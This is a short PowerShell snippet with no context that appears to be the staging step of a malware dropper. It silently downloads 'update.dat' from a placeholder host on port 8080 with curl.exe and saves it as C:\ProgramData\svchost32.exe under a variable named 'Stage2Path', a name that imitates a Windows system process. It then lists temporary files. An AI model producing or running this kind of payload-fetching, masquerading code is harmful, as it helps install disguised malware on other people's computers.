
$FetchUrl = "http://example.com:8080/update.dat"
$Stage2Path = "C:\ProgramData\svchost32.exe"
curl.exe -s -L -o $Stage2Path $FetchUrl
Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
